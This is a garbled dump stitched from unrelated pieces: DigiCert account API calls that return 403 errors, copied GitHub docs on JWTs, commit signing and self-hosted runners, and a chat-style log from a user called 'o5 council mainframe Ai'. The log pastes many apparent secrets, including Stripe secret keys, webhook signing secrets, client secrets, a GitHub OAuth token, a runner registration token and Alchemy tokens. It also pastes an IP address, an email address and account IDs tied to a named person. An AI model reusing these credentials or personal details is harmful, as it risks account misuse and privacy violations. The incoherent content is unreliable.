gem 'appraisal', '~> 2.5' 
gem install appraisal

$ Account id degi cert 90171939-7ae7-4884-85d4-9a5ccc670fa6
Account id organizations 
979310f6-db24-4c67-bcb9-6926d92cd6ec

User id 
fa5e727c-0527-44e0-9004-5fdc347b0b3f

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/organization?account_id=979310f6-db24-4c67-bcb9-6926d92cd6ec
Server response
Code	Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate 
 connection: keep-alive 
 content-encoding: gzip 
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
 content-type: application/json 
 date: Sat,16 Mar 2024 04:52:19 GMT 
 expires: 0 
 pragma: no-cache 
 referrer-policy: no-referrer 
 strict-transport-security: max-age=15724800 
 transfer-encoding: Identity 
 vary: Accept-Encoding 
 x-cdn: Imperva 
 x-content-type-options: nosniff 
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
 x-envoy-upstream-service-time: 10 
 x-frame-options: same-origin 
 x-iinfo: 15-83073046-83073052 NNNN CT(36 39 0) RT(1710564738237 37) q(0 0 1 -1) r(2 2) U11 
 x-xss-protection: 1; mode=block 
Responses
Code	Description	Links
200	
Organization list

Media type

Controls Accept header.
Example Value
Schema
[
  {
    "id": "d9674d8f-7ad6-4280-89b5-136c2aded288",
    "name": "DigiCert Inc.",
    "address": "2801 N Thanksgiving Way",
    "address2": "Suite 500",
    "zip_code": 84043,
    "city": "Lehi",
    "state": "Utah",
    "country": "US",
    "phone": "+1 (123) 456-7890",
    "account": {
      "id": "ff94b6dc-d360-4245-9918-0d0cf7ac347a",
      "name": "Example Account"
    },
    "active": true
  }
]

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 1000'
Request URL
https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6

{
  "id": "ad65390a-0380-4522-bab6-f007c447757a",
  "name": "Example account 1",
  "active": true,
  "service_period": {
    "from": "2021-05-26",
    "to": "2022-05-26"
  },
  "friendly_identifier": "7092363",
  "admins": [
    {
      "id": "f7e866c9-768c-4442-adc9-abe2ba4b69d1",
      "name": "Jane Doe",
      "email": "jane.doe@example.com"
    }
  ],
  "sign_in_methods": [
    {
      "signInMethod": "standard",
      "status": "enabled",
      "mfaStatus": "disabled",
      "clientAuthCertLoginEnabled": false
    }
  ],
  "oauth_clients": [],
  "locale": "en_US"
}
No links

GET

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/account/90171939-7ae7-4884-85d4-9a5ccc670fa6
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate 
 connection: keep-alive 
 content-encoding: gzip 
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
 content-type: application/json 
 date: Sat,16 Mar 2024 04:40:43 GMT 
 expires: 0 
 pragma: no-cache 
 referrer-policy: no-referrer 
 strict-transport-security: max-age=15724800 
 transfer-encoding: Identity 
 vary: Accept-Encoding 
 x-cdn: Imperva 
 x-content-type-options: nosniff 
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
 x-envoy-upstream-service-time: 6 
 x-frame-options: same-origin 
 x-iinfo: 12-53698010-53698015 NNNY CT(35 38 0) RT(1710564042696 63) q(0 0 0 -1) r(1 1) U11 
 x-xss-protection: 1; mode=block

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/account?active=all&name=6309304695' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/account?active=all&name=6309304695
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate 
 connection: keep-alive 
 content-encoding: gzip 
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
 content-type: application/json 
 date: Sat,16 Mar 2024 04:42:23 GMT 
 expires: 0 
 pragma: no-cache 
 referrer-policy: no-referrer 
 strict-transport-security: max-age=15724800 
 transfer-encoding: Identity 
 vary: Accept-Encoding 
 x-cdn: Imperva 
 x-content-type-options: nosniff 
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
 x-envoy-upstream-service-time: 6 
 x-frame-options: same-origin 
 x-iinfo: 7-14411267-14411269 NNNY CT(36 40 0) RT(1710564142411 41) q(0 0 0 -1) r(1 1) U11 
 x-xss-protection: 1; mode=block 
Responses
Code Description Links
200 
List of accounts

Media type

Controls Accept header.
Examples

Example Value
Schema
[
  {
    "id": "50580ac7-60e4-4df2-a834-d12c1ab79afb",
    "name": "Example account 1",
    "active": true,
    "service_period": {
      "from": "2021-05-25",
      "to": "2022-05-25"
    },
    "friendly_identifier": "5258283",
    "admins": [
      {
        "id": "833e4906-fc45-4bd3-841e-40506c0e8ca8",
        "email": "api_service_user_1@example.com"
      },
      {
        "id": "fa8285c7-5e35-4ea8-8cc4-dc95f7dc3cd6",
        "email": "api_service_user_2@example.com"
      },
      {
        "id": "7d78b46a-c635-4bda-8b6d-13802046a963",
        "name": "John Doe",
        "email": "account_user_1@example.com"
      }
    ],
    "sign_in_methods": [
      {
        "signInMethod": "standard",
        "status": "enabled",
        "mfaStatus": "disabled",
        "clientAuthCertLoginEnabled": false
      }
    ],
    "locale": "en_US"
  },
  {
    "id": "be5ffbd2-1a50-4675-912f-2fe015812f87",
    "name": "Example account 2",
    "active": true,
    "service_period": {
      "from": "2021-05-26",
      "to": "2022-05-26"
    },
    "friendly_identifier": "7092363",
    "admins": [],
    "sign_in_methods": [
      {
        "signInMethod": "standard",
        "status": "enabled",
        "mfaStatus": "disabled",
        "clientAuthCertLoginEnabled": false
      }
    ],
    "locale": "en_US"
  }
]

Curl

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/api-access-token?user_id=fa5e727c-0527-44e0-9004-5fdc347b0b3f
Server response
Code Details
403
Undocumented
Error: Forbidden

Response body
Download
{
  "errors": [
    {
      "code": "AUTHORIZATION_ERROR",
      "message": "No authentication data provided"
    }
  ]
}
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate 
 connection: keep-alive 
 content-encoding: gzip 
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
 content-type: application/json 
 date: Sat,16 Mar 2024 04:44:01 GMT 
 expires: 0 
 pragma: no-cache 
 referrer-policy: no-referrer 
 strict-transport-security: max-age=15724800 
 transfer-encoding: Identity 
 vary: Accept-Encoding 
 x-cdn: Imperva 
 x-content-type-options: nosniff 
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
 x-envoy-upstream-service-time: 5 
 x-frame-options: same-origin 
 x-iinfo: 15-83048556-83048560 NNNY CT(36 38 0) RT(1710564241016 44) q(0 0 0 -1) r(1 1) U11 
 x-xss-protection: 1; mode=block 
Responses
Code Description Links
200 
Success

Media type

Controls Accept header.
Example Value
Schema
[
  {
    "id": "7b5d83e7-6e5f-4ade-ad48-111c6f3420f7",
    "user_id": "e7ea1214-d688-48ba-aa1b-131fb2867ac5",
    "name": "API token name",
    "end_date": "2022-05-30T23:59:59Z",
    "start_date": "2021-06-25T21:20:06Z",
    "active": true,
    "enabled": true,
    "masked_api_key": "*************9e2a1"
  }
]

Curl

curl -X 'GET' \
  'https://one.digicert.com/account/api/v1/locales' \
  -H 'accept: application/json' \
  -H 'X-API-Key: 10000'
Request URL
https://one.digicert.com/account/api/v1/locales
Server response
Code	Details
200	
Response body
Download
[
  {
    "code": "de_DE",
    "language": "Deutsch"
  },
  {
    "code": "en_US",
    "language": "English"
  },
  {
    "code": "es_ES",
    "language": "Español"
  },
  {
    "code": "fr_FR",
    "language": "Français"
  },
  {
    "code": "it_IT",
    "language": "Italiano"
  },
  {
    "code": "ja_JP",
    "language": "日本語"
  },
  {
    "code": "ko_KR",
    "language": "한국어"
  },
  {
    "code": "nl_NL",
    "language": "Nederlands"
  },
  {
    "code": "pt_BR",
    "language": "Português"
  },
  {
    "code": "ru_RU",
    "language": "Русский"
  },
  {
    "code": "zh_CN",
    "language": "简体中文"
  },
  {
    "code": "zh_TW",
    "language": "繁體中文"
  }
]
Response headers
 cache-control: no-cache,no-store,max-age=0,must-revalidate 
 connection: keep-alive 
 content-encoding: gzip 
 content-security-policy: default-src 'self' dctrustassistant: http://localhost:*/ http://127.0.0.1:*/ https://127.0.0.1:*/ https://assets.adobedtm.com/ https://*.pendo.io/  https://www.googletagmanager.com/  https://www.google-analytics.com/ https://purecatamphetamine.github.io https://*.fullstory.com/ https://*.digicert.com/ https://fonts.googleapis.com https://fonts.gstatic.com https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.12.313/pdf.worker.js https://*.storage.googleapis.com/ https://services.nvd.nist.gov blob: data: 'unsafe-inline' 'unsafe-eval'; 
 content-type: application/json 
 date: Sat,16 Mar 2024 04:50:15 GMT 
 expires: 0 
 pragma: no-cache 
 referrer-policy: no-referrer 
 strict-transport-security: max-age=15724800 
 transfer-encoding: Identity 
 vary: Accept-Encoding 
 x-cdn: Imperva 
 x-content-type-options: nosniff 
 x-envoy-decorator-operation: account.dcone-prod.svc.cluster.local:8080/* 
 x-envoy-upstream-service-time: 7 
 x-frame-options: same-origin 
 x-iinfo: 18-118172517-118172518 NNNN CT(35 39 0) RT(1710564614160 42) q(0 0 0 -1) r(1 1) U2 
 x-xss-protection: 1; mode=block 
Responses
Code	Description	Links
200	
Locales list

Media type

Controls Accept header.
Examples

Example Value
Schema
[
  {
    "code": "de_DE",
    "language": "Deutsch"
  },
  {
    "code": "en_US",
    "language": "English"
  },
  {
    "code": "es_ES",
    "language": "Español"
  },
  {
    "code": "fr_FR",
    "language": "Français"

Host github.com-repo-0
        Hostname github.com
        IdentityFile=/home/user/.ssh/repo-0_deploy_key

Host github.com-repo-1
        Hostname github.com
        IdentityFile=/home/user/.ssh/repo-1_deploy_key
Host github.com-repo-0 - The repository's alias.
Hostname github.com - Configures the hostname to use with the alias.
IdentityFile=/home/user/.ssh/repo-0_deploy_key - Assigns a private key to the alias.
You can then use the hostname's alias to interact with the repository using SSH, which will use the unique deploy key assigned to that alias. For example:

git clone git@github.com-repo-1:OWNER/repo-1.git

curl --request GET \
--url "https://api.github.com/app" \
--header "Accept: application/vnd.github+json" \
--header "Authorization: Bearer YOUR_JWT" \
--header "X-GitHub-Api-Version: 2022-11-28"
In most cases, you can use Authorization: Bearer or Authorization: token to pass a token. However, if you are passing a JSON web token (JWT), you must use Authorization: Bearer

require 'openssl'
require 'jwt'  # https://rubygems.org/gems/jwt

# Private key contents
private_pem = File.read("YOUR_PATH_TO_PEM")
private_key = OpenSSL::PKey::RSA.new(private_pem)

# Generate the JWT
payload = {
  # issued at time, 60 seconds in the past to allow for clock drift
  iat: Time.now.to_i - 60,
  # JWT expiration time (10 minute maximum)
  exp: Time.now.to_i + (10 * 60),
  # GitHub App's identifier
  iss: "YOUR_APP_ID"
}

jwt = JWT.encode(payload, private_key, "RS256")
puts jwt
Example: Using Python to generate a JWT

Note: You must run pip install jwt to install the jwt package in order to use this script.
Python
#!/usr/bin/env python3
from jwt import JWT, jwk_from_pem
import time
import sys

# Get PEM file path
if len(sys.argv) > 1:
    pem = sys.argv[1]
else:
    pem = input("Enter path of private PEM file: ")

# Get the App ID
if len(sys.argv) > 2:
    app_id = sys.argv[2]
else:
    app_id = input("Enter your APP ID: ")

# Open PEM
with open(pem, 'rb') as pem_file:
    signing_key = jwk_from_pem(pem_file.read())

payload = {
    # Issued at time
    'iat': int(time.time()),
    # JWT expiration time (10 minutes maximum)
    'exp': int(time.time()) + 600,
    # GitHub App's identifier
    'iss': app_id
}

# Create JWT
jwt_instance = JWT()
encoded_jwt = jwt_instance.encode(payload, signing_key, alg='RS256')

print(f"JWT:  {encoded_jwt}")
This script will prompt you for the file path where your private key is stored and for the ID of your app. Alternatively, you can pass those values as inline arguments when you execute the script.

Example: Using Bash to generate a JWT

Note: You must pass your App ID and the file path where your private key is stored as arguments when running this script.
Bash
#!/usr/bin/env bash

set -o pipefail

app_id=$1 # App ID as first argument
pem=$( cat $2 ) # file path of the private key as second argument

now=$(date +%s)
iat=$((${now} - 60)) # Issues 60 seconds in the past
exp=$((${now} + 600)) # Expires 10 minutes in the future

b64enc() { openssl base64 | tr -d '=' | tr '/+' '_-' | tr -d '\n'; }

header_json='{
    "typ":"JWT",
    "alg":"RS256"
}'
# Header encode
header=$( echo -n "${header_json}" | b64enc )

payload_json='{
    "iat":'"${iat}"',
    "exp":'"${exp}"',
    "iss":'"${app_id}"'
}'
# Payload encode
payload=$( echo -n "${payload_json}" | b64enc )

# Signature
header_payload="${header}"."${payload}"
signature=$( 
    openssl dgst -sha256 -sign <(echo -n "${pem}") \
    <(echo -n "${header_payload}") | b64enc 
)

# Create JWT
JWT="${header_payload}"."${signature}"
printf '%s\n' "JWT: $JWT"
Example: Using PowerShell to generate a JWT

In the following example, replace YOUR_PATH_TO_PEM with the file path where your private key is stored. Replace YOUR_APP_ID with the ID of your app. Make sure to enclose the values for YOUR_PATH_TO_PEM in double quotes.

PowerShell
#!/usr/bin/env pwsh

$app_id = YOUR_APP_ID
$private_key_path = "YOUR_PATH_TO_PEM"

$header = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((ConvertTo-Json -InputObject @{
  alg = "RS256"
  typ = "JWT"
}))).TrimEnd('=').Replace('+', '-').Replace('/', '_');

$payload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((ConvertTo-Json -InputObject @{
  iat = [System.DateTimeOffset]::UtcNow.AddSeconds(-10).ToUnixTimeSeconds()  
  exp = [System.DateTimeOffset]::UtcNow.AddMinutes(10).ToUnixTimeSeconds()
  iss = $app_id    
}))).TrimEnd('=').Replace('+', '-').Replace('/', '_');

$rsa = [System.Security.Cryptography.RSA]::Create()
$rsa.ImportFromPem((Get-Content $private_key_path -Raw))

$signature = [Convert]::ToBase64String($rsa.SignData([System.Text.Encoding]::UTF8.GetBytes("$header.$payload"), [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
$jwt = "$header.$payload.$signature"
Write-Host $jwt


$ git config --global --unset gpg.format
Use the gpg --list-secret-keys --keyid-format=long command to list the long form of the GPG keys for which you have both a public and private key. A private key is required for signing commits or tags.
Shell
gpg --list-secret-keys --keyid-format=long
Note: Some GPG installations on Linux may require you to use gpg2 --list-keys --keyid-format LONG to view a list of your existing keys instead. In this case you will also need to configure Git to use gpg2 by running git config --global gpg.program gpg2.
From the list of GPG keys, copy the long form of the GPG key ID you'd like to use. In this example, the GPG key ID is 3AA5C34371567BD2:
Shell

$ gpg --list-secret-keys --keyid-format=long
/Users/hubot/.gnupg/secring.gpg
------------------------------------
sec   4096R/3AA5C34371567BD2 2016-03-10 [expires: 2017-03-10]
uid                          Hubot <hubot@example.com>
ssb   4096R/4BB6D45482678BE3 2016-03-10
To set your primary GPG signing key in Git, paste the text below, substituting in the GPG primary key ID you'd like to use. In this example, the GPG key ID is 3AA5C34371567BD2:
git config --global user.signingkey 3AA5C34371567BD2
Alternatively, when setting a subkey include the ! suffix. In this example, the GPG subkey ID is 4BB6D45482678BE3:
git config --global user.signingkey 4BB6D45482678BE3!
Optionally, to configure Git to sign all commits by default, enter the following command:
git config --global commit.gpgsign true
For more information, see "Signing commits."
If you aren't using the GPG suite, run the following command in the zsh shell to add the GPG key to your .zshrc file, if it exists, or your .zprofile file:
$ if [ -r ~/.zshrc ]; then echo -e '\nexport GPG_TTY=$(tty)' >> ~/.zshrc; \
  else echo -e '\nexport GPG_TTY=$(tty)' >> ~/.zprofile; fi
Alternatively, if you use the bash shell, run this command:
$ if [ -r ~/.bash_profile ]; then echo -e '\nexport GPG_TTY=$(tty)' >> ~/.bash_profile; \
  else echo -e '\nexport GPG_TTY=$(tty)' >> ~/.profile; fi
Optionally, to prompt you to enter a PIN or passphrase when required, install pinentry-mac. For example, using Homebrew:
brew install pinentry-mac
echo "pinentry-program $(which pinentry-mac)" >> ~/.gnupg/gpg-agent.conf
killall gpg-agent
Telling Git about your SSH key

You can use an existing SSH key to sign commits and tags, or generate a new one specifically for signing. For more information, see "Generating a new SSH key and adding it to the ssh-agent."

Note: SSH signature verification is available in Git 2.34 or later. To update your version of Git, see the Git website.
Open Terminal.
Configure Git to use SSH to sign commits and tags:
git config --global gpg.format ssh
To set your SSH signing key in Git, paste the text below, substituting /PATH/TO/.SSH/KEY.PUB with the path to the public key you'd like to use.
git config --global user.signingkey /PATH/TO/.SSH/KEY.PUB
Telling Git about your X.509 key

You can use smimesign to sign commits and tags using S/MIME.

Note: S/MIME signature verification is available in Git 2.19 or later. To update your version of Git, see the Git website.
Install smimesign.
Open Terminal.
Configure Git to use S/MIME to sign commits and tags. In Git 2.19 or later, use the git config gpg.x509.program and git config gpg.format commands:
To use S/MIME to sign for all repositories:
git config --global gpg.x509.program smimesign
git config --global gpg.format x509
To use S/MIME to sign for a single repository:
cd PATH-TO-REPOSITORY
git config --local gpg.x509.program smimesign
git config --local gpg.format x509
In Git 2.18 or earlier, use the git config gpg.program command:
To use S/MIME to sign for all repositories:
git config --global gpg.program smimesign
To use S/MIME to sign for a single repository:
cd  PATH-TO-REPOSITORY
git config --local gpg.program smimesign
If you're using an X.509 key that matches your committer identity, you can begin signing commits and tags.
If you're not using an X.509 key that matches your committer identity, list X.509 keys for which you have both a certificate and private key using the smimesign --list-keys command.
smimesign --list-keys
From the list of X.509 keys, copy the certificate ID of the X.509 key you'd like to use. In this example, the certificate ID is 0ff455a2708394633e4bb2f88002e3cd80cbd76f:
$ smimesign --list-keys
             ID: 0ff455a2708394633e4bb2f88002e3cd80cbd76f
            S/N: a2dfa7e8c9c4d1616f1009c988bb70f
      Algorithm: SHA256-RSA
       Validity: 2017-11-22 00:00:00 +0000 UTC - 2020-11-22 12:00:00 +0000 UTC
         Issuer: CN=DigiCert SHA2 Assured ID CA,OU=www.digicert.com,O=DigiCert Inc,C=US
        Subject: CN=Octocat,O=GitHub\, Inc.,L=San Francisco,ST=California,C=US
         Emails: octocat@github.com
To set your X.509 signing key in Git, paste the text below, substituting in the certificate ID you copied earlier.
To use your X.509 key to sign for all repositories:
git config --global user.signingkey 0ff455a2708394633e4bb2f88002e3cd80cbd76f
To use your X.509 key to sign for a single repository:
cd  PATH-TO-REPOSITORY
git config --local user.signingkey 0ff455a2708394633e4bb2f88002e3cd80cbd76f
  $ RoadRunner ReadMe

gh pr checkout 1
brew install gh
or
Download for Mac
View installation instructions →
$ gh release create
# Create a folder
$ mkdir actions-runner && cd actions-runner
# Download the latest runner package
$ curl -o actions-runner-linux-arm64-2.314.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.314.1/actions-runner-linux-arm64-2.314.1.tar.gz
# Optional: Validate the hash
$ echo "3d27b1340086115a118e28628a11ae727ecc6b857430c4b1b6cbe64f1f3b6789  actions-runner-linux-arm64-2.314.1.tar.gz" | shasum -a 256 -c
# Extract the installer
$ tar xzf ./actions-runner-linux-arm64-2.314.1.tar.gz
Configure
# Create the runner and start the configuration experience
$ ./config.sh --url https://github.com/grateful345/Wiz-Go-call-sign --token BHAHZGCJZK3BEVS7IRGZMKDF6USLO
# Last step, run it!
$ ./run.sh
Using your self-hosted runner
# Use this YAML in your workflow file for each job
runs-on: self-hosted

Windows.

# Create a folder under the drive root
$ mkdir actions-runner; cd actions-runner
# Download the latest runner package
$ Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v2.314.1/actions-runner-win-arm64-2.314.1.zip -OutFile actions-runner-win-arm64-2.314.1.zip
# Optional: Validate the hash
$ if((Get-FileHash -Path actions-runner-win-arm64-2.314.1.zip -Algorithm SHA256).Hash.ToUpper() -ne 'acc807696d1dcad6fb45f6038f884185c54c48127445c365e86d03adb164a9e2'.ToUpper()){ throw 'Computed checksum did not match' }
# Extract the installer
$ Add-Type -AssemblyName System.IO.Compression.FileSystem ; [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD/actions-runner-win-arm64-2.314.1.zip", "$PWD")
Configure
# Create the runner and start the configuration experience
$ ./config.cmd --url https://github.com/grateful345/Wiz-Go-call-sign --token BHAHZGCJZK3BEVS7IRGZMKDF6USLO
# Run it!
$ ./run.cmd
Using your self-hosted runner
# Use this YAML in your workflow file for each job
runs-on: self-hosted
fee957d729b358d84b9d1a8182a2b1dd633689c9 (Fandom $$$ token rare)

Stripe-Signature:
t=1492774577,
v1=5257a869e7ecebeda32affa62cdca3fa51cad7e77a0e56ff536d0ce8e108d8bd,
v0=6ffbb59b2300aae63f272406069a9788598b792a944a07aba816edb039

FamousToday

MIB_agency_file.pdf
3.62 MB

o5 council mainframe Ai — 02/24/2024 12:51 AM
README.md

o5 council mainframe Ai — 02/24/2024 12:59 AM
Copy "requiredResourceAccess": [ { "resourceAppId": "00000002-0000-0000-c000-000000000000", "resourceAccess": [ { "id": "311a71cc-e848-46a1-bdf8-97ff7156d8e6", "type": "Scope" } ] } ], samlMetadataUrl attribute

o5 council mainframe Ai — 02/24/2024 2:10 AM
fcaowns_1MwVKR2eZvKYlo2CGV7Mmt6s
[2:11 AM]
fetch('https://{{sk_test_4eC39HqLyjWDarjtT1zdp7dc:}}/connection_token', { method: "POST" }); 
Connection token stripe

Webhook ID data stripe 

—header—
‘we_1Oa74JGF83d3fsgWfJ6n3SSa’

Webhook signing data 
—header—
‘whsec_PwrdbHDsw0GYve1NbZHjacu7g3nUH8Vu’

Item potency Key 
—header—
‘92281688-5a41-4be2-8e1b-ea48c81eae85’

// This is your Stripe CLI webhook secret for testing your endpoint locally.
        String endpointSecret = "whsec_da6d6364681be84689d4b526b26fd5a4d339eb3ec4dcdbab9047fd89909a6244";

Stripe charge automation api key 2337b090-a837-11ee-9efa-651583e247bf

access_token":"gho_16C7e42F292c6912E7710c838347Ae178B4a", "scope":"repo,gist", "token_type":"bearer" } Accept: application/xml <token_type>bearer</token_type> repo,gist <access_token>gho_16C7e42F292c6912E7710c838347Ae178B4a</access_token>

o5 council mainframe Ai — 02/24/2024 10:44 AM
https://github.com/6309304695/OVERSEER-GRATEFUL345I/blob/6309304695-patch-65/README.md

o5 council mainframe Ai — 02/24/2024 11:20 AM
https://github.com/6309304695/OVERSEER-GRATEFUL345I.git                    https://github.com/6309304695/OVERSEER-GRATEFUL345I.git  gh repo clone 6309304695/OVERSEER-GRATEFUL345I
[11:26 AM]
https://patch-diff.githubusercontent.com/raw/6309304695/OVERSEER-GRATEFUL345I/pull/106.patch

o5 council mainframe Ai — 02/24/2024 2:58 PM
https://patch-diff.githubusercontent.com/raw/6309304695/OVERSEER-GRATEFUL345I/pull/112.patch
[3:00 PM]
https://patch-diff.githubusercontent.com/raw/6309304695/OVERSEER-GRATEFUL345I/pull/112.diff

o5 council mainframe Ai — 02/24/2024 8:09 PM


o5 council mainframe Ai — 02/24/2024 8:17 PM
SUR

o5 council mainframe Ai — 02/24/2024 9:10 PM

[9:10 PM]


o5 council mainframe Ai — 02/24/2024 9:17 PM
{{ txi_1Omd5MGF83d3fsgWxIHULLcs }} object id gods time 

{{ txi_1OT14cGF83d3fsgWupcH0pyK }}
Object id Keith Bieszczat’s sr

o5 council mainframe Ai — 02/24/2024 9:55 PM

February 25, 2024

o5 council mainframe Ai — 02/25/2024 1:22 AM
"seti_1NG8Du2eZvKYlo2C9XMqbR0x"
[1:23 AM]
https://patch-diff.githubusercontent.com/raw/6309304695/OVERSEER-GRATEFUL345I/pull/113.patch?fbclid=IwAR1WLOGSQjtyXByJ0qIN2Q7araMHYKWXFlPxnZFAvG_kCQb-vg5cbwI0MhU_aem_AZJewCm5W84xuj63pQ64jbTEPCuYPjrzmWjveL73H5Eb74yXvJAbAwRZpXDLxWngD90

e,logger, Fatal (e Start(“localhost: 4242”))

•Keith Bieszeat Arcounts
'acct10RB 1 MBOdjLENdyb'
'acct_10 R5eP6F83d3fsgW'
'acct_10525V4M+B15R03B'

•Identity thief 
'acet 10R9pdQD5Hu917xk'
[1:24 AM]
"vs_1NuNAILkdIwHu7ixh7OtGMLw",
[1:24 AM]
Verification session above

o5 council mainframe Ai — 02/25/2024 1:29 AM
import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.identity.VerificationSession.retrieve("vs_1NuNAILkdIwHu7ixh7OtGMLw")
Product id
‘prod_NWjs8kKbJWmuuc’
[1:30 AM]
stripe.Product.modify(
  "prod_NWjs8kKbJWmuuc",
  metadata={"order_id": "6735"}
[1:35 AM]
"id": "cus_NffrFeUfNV2Hib"

o5 council mainframe Ai — 02/25/2024 1:50 AM
"owner_id": "usr_2cSjwF6w6AynjfPtm4Ww5xTdkId",
[1:50 AM]
{"device_id": "d5111ba7-0cc5-4ba3-8398-e6c79e4e89c2"}

o5 council mainframe Ai — 02/25/2024 1:57 AM
ic_1MytUz2eZvKYlo2CZCn5fuvZ", "created": 1682059060, "device_id": "1234567ABCDEFG242424242424242420123456789ABCDEFG", "last4": "2424", "livemode": false, "status": "active", "token_reference_id": "DNITHE002424242424242424"
[1:58 AM]
device_id": "1234567ABCDEFG242424242424242420123456789ABCDEFG"
[1:59 AM]
client_secret: seti_1NG8Du2eZvKYlo2C9XMqbR0x_secret_O2CdhLwGFh2Aej7bCY7qp8jlIuyR8DJ
[2:00 AM]
"id": "seti_1NG8Du2eZvKYlo2C9XMqbR0x"
[2:00 AM]
seti_1NG8Du2eZvKYlo2C9XMqbR0x_secret_O2CdhLwGFh2Aej7bCY7qp8jlIuyR8DJ
[2:01 AM]
idempotency_key": 6f5410cb-1ecc-4302-8130-baf8dd8c0a50 }
[2:01 AM]
ID req_ZIIVfKfNp6QrOh Time 12/27/23, 8:29:28 PM IP address 73.44.108.236 (from server at 73.44.108.236) API version 2023-08-16 Latest Source Dashboard — grateful345i@gmail.com Idempotency K
[2:02 AM]
'{fcsess_client_secret_KRJTKvCY3IKoYTrW18EazcO3}
[2:03 AM]


Alchemy signing key webhook 
1. whsec_Ka3G2XkXDVxzhdrFzG8n2OFq

2. whsec_rEV4KKHw57OALQ73encoFHDB ethermeum 

3. whsec_pa1W66wlvZyfLuESqE939OxD polygon matic

"X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"

Alchemy Auth token : jE92Hk8uCBZnJEh1PP0PoUVDwnuYFdVp

Alchemy Webhook identifications
wh_pae2ekjly3q7fhx9 
Ethereum Mainnet
active
https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator

V2 wh_cktmaceotb7zou0i 
Polygon Mainnet

